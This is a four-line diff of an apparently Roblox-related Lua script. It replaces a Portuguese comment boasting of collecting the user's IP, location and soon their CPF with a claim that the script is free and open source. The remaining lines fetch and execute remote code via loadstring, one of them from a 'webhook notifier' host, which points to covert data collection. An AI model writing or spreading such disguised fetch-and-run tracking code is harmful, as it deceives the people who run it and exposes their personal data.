@@ -1,4 +1,4 @@
--- obrigado por você dar o seu IP para nós! Seu pais, sua localização, e já já seu CPF
+-- este script é open source! Livre para todos. 
 
 local Libary = loadstring(game:HttpGet("https://raw.githubusercontent.com/phgs-oficial/Slateste/refs/heads/main/Redzhubui.lua"))()
 local requestWebhook = loadstring(game:HttpGet("https://blox-webhook-notifier.onrender.com/script/library"))()
